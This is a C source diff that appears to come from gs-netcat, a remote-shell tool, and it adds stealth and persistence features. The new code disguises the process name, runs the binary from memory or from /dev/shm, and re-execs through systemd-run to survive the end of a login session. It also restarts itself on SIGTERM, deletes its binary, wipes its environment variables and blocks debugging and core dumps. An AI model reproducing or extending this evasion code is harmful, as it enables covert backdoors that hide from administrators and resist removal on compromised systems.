@@ -8,6 +8,17 @@
 
 extern char **environ;
 
+static void
+zap_env(const char *name) {
+	if (!(gopt.flags & GSC_FL_IS_STEALTH))
+		return;
+	size_t len = strlen(name);
+	char *ptr = getenv(name);
+	if (ptr == NULL)
+		return;
+
+	memset(ptr - len - 1 /* '='-sign */, 0, len + 1 + strlen(ptr)); // Clear env variable
+}
 /*
  * Add list of argv's from GSOCKET_ARGS to argv[]
  * result: argv[0] + GSOCKET_ARGS + argv[1..n]
@@ -180,8 +191,10 @@ try_execme(char *exename, char *argv[]) {
 
 	argv[0] = gopt.proc_hiddenname;
 	
-	if (gopt.flags & GSC_FL_MEMEXEC)
+	if (gopt.flags & GSC_FL_MEMEXEC) {
+		unsetenv("GS_NOMEMEXEC");
 		try_memexecme(src, argv);
+	}
 	try_cpexecme("/dev/shm", src, argv);
 	try_cpexecme("/var/tmp", src, argv);
 
@@ -222,7 +235,7 @@ read_proc_cmd(char *dst, size_t sz, pid_t pid) {
 }
 
 // Called after tried to hide so that we can check if any other process hides
-// like us (and we consider this a duplicate to exit(0)).
+// like us (and we consider this a duplicate and call exit(0)).
 // Note: /proc/PID/exe is not always accessible (for non-root). Instead, /proc/PID/stat
 // holds the name of the executable file (ps -fp <PID> -o pid,comm,cmd). For memfd_create
 // this is a number. 
@@ -282,12 +295,16 @@ is_running(void) {
 			}
 		}
 
+		size_t prg_exename_sz = 0;
+		if (gopt.prg_exename)
+			prg_exename_sz = strlen(gopt.prg_exename) + 1;
 		if (mycmd_sz > 0) {
 			cmd_sz = read_proc_cmd(cmd, sizeof cmd, pid);
 			if (cmd_sz > 0) {
 				// Check if this is either or:
 				// 1. Our argv[0]
 				// 2. The argv[0] only used if SWD received a SIGTERM.
+				// 3. The GS_BIN name (in case gsnc failed to change argv[0])
 				int is_match = 0;
 				if (cmd_sz == mycmd_sz) {
 					if (memcmp(cmd, mycmd, cmd_sz) == 0)
@@ -295,6 +312,10 @@ is_running(void) {
 				}
 				if (cmd_sz == strlen(GSNC_PROC_HN_SIGTERM) + 1) {
 					if (memcmp(cmd, GSNC_PROC_HN_SIGTERM, cmd_sz) == 0)
+						is_match = 1;
+				}
+				if ((gopt.prg_exename) && (cmd_sz == prg_exename_sz)) {
+					if (memcmp(cmd, gopt.prg_exename, cmd_sz) == 0)
 						is_match = 1;
 				}
 				if (!is_match)
@@ -332,9 +353,6 @@ static void
 changeargv0_finish(void) {
 	char *ptr;
 
-	unsetenv("_GS_FS_EXENAME");
-	unsetenv("_GS_PROC_EXENAME");
-	
 	if ((ptr = getenv("_GS_DELME"))) {
 		unlink(ptr);
 		unsetenv("_GS_DELME");
@@ -353,16 +371,12 @@ changeargv0_finish(void) {
 			exit(0);
 	}
 
-	if (strcmp(gopt.prg_name, GSNC_PROC_HN_SIGTERM) == 0)
+	if (gopt.proc_hiddenname == NULL)
+		gopt.proc_hiddenname = GSNC_PROC_HN_SIGTERM; // can not happen.
+	if (strcmp(gopt.proc_hiddenname, GSNC_PROC_HN_SIGTERM) == 0)
 		gopt.flags |= GSC_FL_SWD_SURVIVED_SIGTERM;
 
-	if (gopt.flags & GSC_FL_STARTED_BY_SWD) {
-		// Keep the argv that the watchdog gave us. Might be '-bash' if we received
-		// a SIGTERM.
-		gopt.proc_hiddenname = gopt.prg_name;
-	}
-
-	DEBUGF("Now hidden as gopt.prg_name=%s [orig EXENAME=%s]\n", gopt.prg_name, gopt.prg_exename);
+	DEBUGF("Now hidden as gopt.proc_hiddenname=%s [orig EXENAME=%s]\n", gopt.proc_hiddenname, gopt.prg_exename);
 	// SEAL after config had been read.
 #ifdef PR_SET_DUMPABLE
 	prctl(PR_SET_DUMPABLE, 0);
@@ -377,118 +391,192 @@ changeargv0_finish(void) {
 	signal(SIGTRAP, SIG_IGN);
 }
 
+// Return 1 if we are in a systemd session (this will re-exec us via systemd-run --scope) 
+// Return 0 to ignore (do not restart with systemd-run --scope)
+static int
+is_in_login_session(void)
+{
+	FILE *fp;
+	char buf[512];
+	int in_session = 0;
+
+	fp = fopen("/proc/self/cgroup", "r");
+	if (fp == NULL)
+		return 0; // Do not systemd-run
+
+	while (fgets(buf, sizeof buf, fp) != NULL) {
+		if (strstr(buf, "session-") != NULL && strstr(buf, ".scope") != NULL) {
+			in_session = 1;
+			break;
+		}
+	}
+	fclose(fp);
+	return in_session;
+}
+
+static int
+is_kill_user_processes_enabled(void)
+{
+	FILE *fp;
+	char buf[256];
+	int enabled = -1;
+
+	fp = popen("busctl get-property org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager KillUserProcesses 2>/dev/null", "r");
+	if (fp == NULL)
+		return 0; // Do not systemd-run
+
+	if (fgets(buf, sizeof buf, fp) != NULL) {
+		if (strstr(buf, "true") != NULL)
+			enabled = 1;
+		else if (strstr(buf, "false") != NULL)
+			enabled = 0;
+	}
+	pclose(fp);
+	return enabled;
+}
+
+// Prevent KillUserProcesses=yes from killing us by re-execing us via systemd-run --scope --user.
+// This must be done before forking or daemonizing. Otherwise, the caller's session may exit before
+// we re-exec into our own .scope and we would get killed by KillUserProcesses=yes.
+// Note: Won't work if executed via memexec because we can't execveat() ourselves into a new .scope.
+// (Implementing the dbus protocol is not portable as a static binary).
+static void
+try_systemd_run() {
+	if (!(gopt.flags & GSC_FL_IS_STEALTH))
+		return;
+	if (gopt.flags & GSC_FL_STARTED_BY_SWD)
+		return; // Self-Watch-Dog restart: We are already surviving KillUserProcesses=yes.
+	if (getenv("_GS_SYSTEMD_RUN") != NULL)
+		return;
+
+	if (getuid() == 0)
+		return; // Root user is not effected by KillUserProcesses=yes.
+
+	if (is_in_login_session() == 0)
+		return; // No login session. KillUserProcesses=yes has no effect.
+
+	if (is_kill_user_processes_enabled() == 0)
+		return;
+
+	if ((!gopt.prg_exename) || (strcmp(gopt.prg_exename, "/proc/self/exe") == 0)) {
+		fprintf(stderr, "WARN: KillUserProcess=yes. Will likely get killed once the user session exits. Set GS_EXENAME=<absolute path>\n");
+		// FIXME: Could copy /proc/self/exe to /dev/shm/gsnc and execute that?
+		return;
+	}
+	setenv("_GS_SYSTEMD_RUN", "1", 1);
+
+	char *argv[] = { "systemd-run", "--quiet", "--scope", "--user", gopt.prg_exename, NULL };
+	execvp("systemd-run", argv);
+	DEBUGF("execv(%s): %s\n", gopt.prg_exename, strerror(errno));
+}
+
 static void
 try_changeargv0(int argc, char *argv[]) {
 	char *ptr;
 	int is_ldso = 0;
-	// On actual filesystem. Not /proc/self/exe. If
-	// set the used to report to user.
-	char *fs_exename = NULL;
-	// If executed from memfd then fs_exename is NULL. Need to read config from here
-	// and execve() this.
-	char *myself_exe = NULL;
+	char *myself_exe = NULL; // Points to file that contains the config (not the bincrypted version).
+	// This is also used to change argv0 via exec().
+	// This is NOT used for systemd-run (as it cannot accept /proc/self/exe).
 	gopt.err_fp = stderr;
 
 	if ((argv == NULL) || (argv[0] == NULL))
 		return;
 
-	// First check if we called ourself and return immediately.
-	if ((ptr = getenv("_GS_FS_EXENAME")))
+	// Passed through by caller
+	if ((ptr = getenv("_GS_FS_EXENAME")) || (ptr = GS_GETENV2("EXENAME")))
 		gopt.prg_exename = strdup(ptr);
 
-	if ((ptr = getenv("_GS_PROC_EXENAME"))) {
-		if (GSNC_config_read(ptr) != 0) {
-			changeargv0_finish();
-			exit(0); // CAN NOT HAPPEN. (should have failed in parent already)
-		}
+	if (getenv("_GS_REEXEC_DONE")) {
+		// 1. Called by ourself in an attempt to change argv0.
+		// 2. Called by SWD_reexec() (and no need to change argv0).
+		GSNC_config_read_any(argv[0]);
+		// Continue even without config. Use env variables or defaults.
 		goto done;
 	}
 
-	if ((ptr = GS_GETENV2("EXENAME")) != NULL)
-		fs_exename = strdup(ptr);
-	else {
-		// Find true binary in case we were executed:
-		// - bash -c 'exec -a foobar /lib/ld-linux-aarch64.so.1 /usr/bin/gsnc'
-		// - bash -c 'exec -a foobar /usr/bin/gsnc'
-		// Always try to try_execme(). Lastly, fall back to just changing argv[0]
-		// but not if it is executed by ld-linux.
-		// Note: argv0 points to the gsnc if started with ld-linux.so
-		// but /proc/self/cmdline shows as argv0 == /lib/ld-linux.so
-		// stat(), open() and readlink have special behavior in /proc.
-		// realpath() will return NULL if deleted or not exist.
-		// readlink() will return link.
-		// stat(/proc/self/exe) will always succeed.
-		ptr = realpath("/proc/self/exe", NULL /* with malloc */);
-		if (ptr != NULL) {
-			// HERE: link destination EXISTS
-			if (strstr(ptr, "ld-linux") != NULL) {
-				is_ldso = 1;   // exename remains argv[0]
-				free(ptr);
-			} else if (strstr(ptr, "(deleted)") != NULL) {
-				// A sneaky user created "<name> (deleted)" file, which is not us.
-				free(ptr);
-			} else {
-				// Destination exists. Ignore argv0.
-				fs_exename = ptr; // points to true binary
-			}
+	// Find binary to read our config from
+	// Note: Could have been started like this:
+	// - bash -c 'exec -a foobar /lib/ld-linux-aarch64.so.1 /usr/bin/gsnc'
+	// - bash -c 'exec -a foobar /usr/bin/gsnc'
+	// - memexec
+	// - bincrypter
+	// Note: argv0 points to the gsnc if started with ld-linux.so
+	// but /proc/self/cmdline shows as argv0 == /lib/ld-linux.so
+	// stat(), open() and readlink have special behavior in /proc.
+	// - realpath() will return NULL if deleted or not exist.
+	// - readlink() will return link.
+	// - stat(/proc/self/exe) will always succeed.
+	ptr = realpath("/proc/self/exe", NULL /* with malloc */);
+	if (ptr != NULL) {
+		// HERE: link destination EXISTS
+		if (strstr(ptr, "ld-linux") != NULL) {
+			is_ldso = 1;   // exename remains argv[0]
+			free(ptr);
+		} else if (strstr(ptr, "(deleted)") != NULL) {
+			// A sneaky user created "<name> (deleted)" file, which is not us.
+			free(ptr);
 		} else {
-			// HERE: Link destination does _NOT_ exists. (memfd or deleted)
-			// musl-static compile uses O_LARGEFILE but linux <= 2.6 open() on
-			// /proc/self/exe will always fail if O_LARGEFILE is called. Thus
-			// test-open and fall back to argv0
-			int fd;
-			if ((fd = open("/proc/self/exe", O_RDONLY)) >= 0) {
-				myself_exe = "/proc/self/exe";
-				close(fd);
-			}
+			// Destination exists.
+			if (gopt.prg_exename == NULL)
+				gopt.prg_exename = ptr; // points to true binary on filesystem (not /proc/self/exe)
+			// It's not binarycrypted. This contains the config:
+			myself_exe = ptr;
 		}
-		if (fs_exename == NULL)
-			fs_exename = realpath(argv[0], NULL /* malloc */);
 	}
 
+	if (gopt.prg_exename == NULL) {
+		// Try argv[0] as fallback.
+		gopt.prg_exename = realpath(argv[0], NULL);
+	}
+
+	// Consider systems where /proc/self/exe does not exist (or fails to open).
 	if (myself_exe == NULL) {
-		myself_exe = fs_exename;
+		// HERE: Link destination does _NOT_ exists. (memfd or deleted)
+		// musl-static compile uses O_LARGEFILE in realpath(), but linux <= 2.6 open() on
+		// /proc/self/exe will always fail if O_LARGEFILE is called. Thus
+		// test-open and fall back to argv0
 		int fd;
-		if ((fd = open(myself_exe, O_RDONLY)) < 0)
-			ERREXIT("%s: %s. Execute with absolute path or set GS_EXENAME=<absolute path>\n", strerror(errno), myself_exe);
-		close(fd);
+		if ((fd = open("/proc/self/exe", O_RDONLY)) >= 0) {
+			close(fd);
+			myself_exe = "/proc/self/exe";
+		} else {
+			// This is one last desperate attempt to find the config: Assuem prg_exename is not bincrypted.
+			myself_exe = gopt.prg_exename; // might be NULL as well.
+		}
 	}
-	DEBUGF("fs_Exename='%s' config_exe='%s'\n", fs_exename, myself_exe);
 
+	DEBUGF("gopt.prg_exename='%s' myself_exe='%s'\n", gopt.prg_exename?:"NULL", myself_exe?:"NULL");
+
+	// gopt.config_fsname = myself_exe;
 	if (GS_GETENV2("CONFIG_CHECK")) {
 		gopt.flags |= GSC_FL_CONFIG_CHECK;
-		GSNC_config_read(GS_GETENV2("CONFIG_READ")?:myself_exe);
+		GSNC_config_read_any(argv[0] /*GS_GETENV2("CONFIG_READ")?:myself_exe*/);
 		return;
 	}
-
-	gopt.prg_exename = fs_exename;
 
 	if (GS_GETENV2("CONFIG_WRITE") != NULL)
 		return;
 
-	if (GSNC_config_read(myself_exe) != 0) {
+	// Leave session and move into scope to prevent KillUserProcesses=yes from killing us (if enabled).
+	try_systemd_run();
+
+	if (GSNC_config_read_any(argv[0] /*GS_GETENV2("CONFIG_READ")?:myself_exe*/) != 0) {
 		if (GS_GETENV2("SHOW_RUNNING"))
 			exit(255);
-		return;
+		// Even without config, maybe ENV was set => CONTINUE. Otherwise, we would not be able to start gsnc without config.
 	}
 
 	if (gopt.proc_hiddenname == NULL) {
-		DEBUGF("Config has no PROC_HIDDENNAME.\n");
-		goto done; // Dont want to change argv0
-	}
-
-	if (gopt.flags & GSC_FL_STARTED_BY_SWD) {
-		// Keep the argv that the watchdog gave us. Might be '-bash' if we received
-		// a SIGTERM.
-		gopt.proc_hiddenname = strdup(argv[0]);
+		DEBUGF("Config has no GS_PROC_HIDDENNAME.\n");
+		goto done; // Don't want to change argv0
 	}
 
 	if (!(gopt.flags & GSC_FL_REEXEC))
 		goto done;
 
-	setenv("_GS_PROC_EXENAME", myself_exe, 1);
-	if (fs_exename != NULL)
-		setenv("_GS_FS_EXENAME", fs_exename, 1);
+	setenv("_GS_REEXEC_DONE", "1", 1);
+	if (gopt.prg_exename != NULL)
+		setenv("_GS_FS_EXENAME", gopt.prg_exename, 1);
 
 	if (try_execme(myself_exe, argv) == 0)
 		exit(255); // CAN NOT HAPPEN. should -1 on execve fail.
@@ -559,9 +647,16 @@ do_util_test_changecgroup(void) {
 	exit(255);
 }
 
+static void
+cb_sigterm(int sig) {
+	sv_sigforward(sig);
+	gopt.exit_code = EX_SIGTERM;
+	SWD_reexec();
+	_exit(EX_SIGSEGV); // NOT REACHED.
+}
+
 void
 init_defaults1(int argc, char *argv[]) {
-	char *argv0 = argv[0];
 	char *ptr;
 #ifdef DEBUG
 	gopt.is_built_debug = 1;
@@ -575,18 +670,30 @@ init_defaults1(int argc, char *argv[]) {
 		if (*ptr == '0')
 			gopt.flags &= ~GSC_FL_IS_STEALTH;
 	}
+	signal(SIGPIPE, SIG_IGN);
+	signal(SIGCHLD, SIG_IGN);	// no defunct childs please
+	wait(NULL); // reap any defunct childs (from bincrypter?)
+
+	// Here: May have been forked and exec'd from a previous signal handler.
+	// Linux will never see the previous signal handler return. Linux still has
+	// the signal blocked. Need to unblock:
+	sigset_t cur;
+	sigemptyset(&cur);
+	sigaddset(&cur, SIGTERM);
+	sigaddset(&cur, SIGSEGV);
+	sigprocmask(SIG_UNBLOCK, &cur, NULL);
+	signal(SIGTERM, cb_sigterm);
+
+	// Remove variables from deploy.sh
+	unsetenv("GS_FFPID");
 	if (!(gopt.flags & GSC_FL_IS_STEALTH))
 		return;
 
-	gopt.prg_name = argv0;
-	if (gopt.prg_name != NULL) {
-		if ((ptr = strrchr(gopt.prg_name, '/')) != NULL)
-			gopt.prg_name = ptr + 1;
-	}
-	gopt.prg_name = strdup(gopt.prg_name?:"NULL");
-
-    if (getenv("_GS_SWD") != NULL)
+	ptr = GS_getenv("_GS_SWD");
+	if (ptr) {
 		gopt.flags |= GSC_FL_STARTED_BY_SWD;
+		gopt.swd_str = strdup(ptr);
+	}
 
 	ptr = GS_GETENV2("CONFIG_READ");
     if ((ptr == NULL) || (*ptr != '0'))
@@ -595,6 +702,43 @@ init_defaults1(int argc, char *argv[]) {
 		gopt.flags &= ~GSC_FL_IS_STEALTH; // implied. if CONFIG_READ=0
 		return;
 	}
+
+	// NOTE: This point is passed 4 times:
+	// 1. On first startup
+	// 2. After systemd-run
+	// 3. After re-exec with new argv[0] (if wanted)
+	// 4. Re-exec triggered by Self-Watch-Dog (SWD)
+
+	// Fill in config from the env variables.
+	// This is needed in two cases:
+	// 1. SWD re-exec & there is no config attached to the binary or binary has vanished.
+	// 2. User wants to start gsnc without config attached to binary.
+	if (GS_getenv("GS_CCG")) {
+		unsetenv("GS_CCG");
+		gopt.flags |= GSC_FL_CHANGE_CGROUP;
+	}
+
+	gopt.flags |= GSC_FL_MEMEXEC;
+	if (GS_getenv("GS_NOMEMEXEC"))
+		gopt.flags &= ~GSC_FL_MEMEXEC;
+
+	gopt.gs_host = GS_GETENV2("HOST");
+	if (gopt.gs_host)
+		gopt.gs_host = strdup(gopt.gs_host);
+
+	if ((ptr = GS_getenv("GS_PORT")) != NULL)
+		gopt.gs_port = atoi(ptr);
+
+	if ((ptr = GS_getenv("GS_PROC_HIDDENNAME")) != NULL)
+		gopt.proc_hiddenname = strdup(ptr);
+
+	if (GS_getenv("GS_REEXEC") != NULL)
+		gopt.flags |= GSC_FL_REEXEC;
+
+	// if ((ptr == GS_getenv("GS_EXENAME")) != NULL) {
+	// 	gopt.prg_exename = strdup(ptr);
+	// }
+	// END OF DEFAULTS.
 
 	try_changeargv0(argc, argv); // If wanted, calls GSNC_config_read()
 	if (gopt.flags & GSC_FL_CONFIG_CHECK)
@@ -630,8 +774,6 @@ init_defaults2(int argc, int *argcptr, char **argvptr[])
 	// gopt.log_fp = stderr;
 	gopt.err_fp = stderr;
 	gopt.argc = argc;
-	signal(SIGPIPE, SIG_IGN);
-	signal(SIGCHLD, SIG_IGN);	// no defunct childs please
 
 	/* MacOS process limit is 256 which makes Socks-Proxy yield...*/
 	struct rlimit rlim;
@@ -685,13 +827,6 @@ gs_create(void)
 		GS_set_token(gs, gopt.token_str, strlen(gopt.token_str));
 
 	return gs;
-}
-
-static void
-cb_sigterm(int sig) {
-	sv_sigforward(sig);
-	gopt.exit_code = EX_SIGTERM;
-	exit(EX_SIGTERM);	// will call cb_atexit(). May fork & exit.
 }
 
 void
@@ -848,6 +983,17 @@ init_vars(void)
 	if (gs_args != NULL)
 		GS_LOG_V("=Extra arguments: '%s'\n", gs_args);
 
+	// Clear the env. This is no longer needed. SWD will set these again on re-exec.
+	zap_env("_GS_SWD");
+	zap_env("GS_ARGS");
+	zap_env("GS_PROC_HIDDENNAME");
+	zap_env("GS_BEACON");
+	zap_env("GS_PORT");
+	zap_env("GS_HOST");
+	zap_env("_GS_SYSTEMD_RUN");
+	zap_env("_GS_FS_EXENAME");
+	zap_env("_GS_REEXEC_DONE");
+
 	if ((gopt.flags & GSC_FL_OPT_QUIET) && (!is_sec_by_prompt))
 		gopt.is_greetings = 0;
 
@@ -876,15 +1022,6 @@ init_vars(void)
 	if ((gopt.is_interactive && !(gopt.flags & GSC_FL_IS_SERVER) && !gopt.is_stdin_a_tty))
 		gopt.is_stdin_ignore_eof = 1;
 
-	// Here: May have been forked and exec'd from a previous signal handler.
-	// Linux will never see the previous signal handler return. Linux still has
-	// the signal blocked. Need to unblock:
-	sigset_t cur;
-	sigemptyset(&cur);
-	sigaddset(&cur, SIGTERM);
-	sigaddset(&cur, SIGSEGV);
-	sigprocmask(SIG_UNBLOCK, &cur, NULL);
-	signal(SIGTERM, cb_sigterm);
 }
 
 void
@@ -1747,15 +1884,16 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	// Cant use C.UTF-8 here because it screws up `systemctl status` output
 	envp[envplen++] = "LANG=en_US.UTF-8";
 	envp[envplen++] = "GS_CONFIG_READ=0";
+	envp[envplen++] = "LC_PTY=1"; // disable pty sniffer
+	snprintf(buf, sizeof buf, "GSNC_PID=%d", gsnc_pid);
+	envp[envplen++] =  strdup(buf);
+
 	// If server had HOST/PORT in ENV or config then pass these to the user's shell:
 	// Subsequent 'gsnc -s ...' shall go to the same gs-relay.
-	str = gopt.gs_host?:GS_GETENV2("HOST");
-	if (str) {
-		snprintf(buf, sizeof buf, "GS_HOST=%s", str);
+	if (gopt.gs_host) {
+		snprintf(buf, sizeof buf, "GS_HOST=%s", gopt.gs_host);
 		envp[envplen++] = strdup(buf);
 	}
-	if ((gopt.gs_port <= 0) && (str = GS_GETENV2("PORT")))
-		gopt.gs_port = atoi(str);
 	if (gopt.gs_port > 0) {
 		snprintf(buf, sizeof buf, "GS_PORT=%d", gopt.gs_port);
 		envp[envplen++] = strdup(buf);
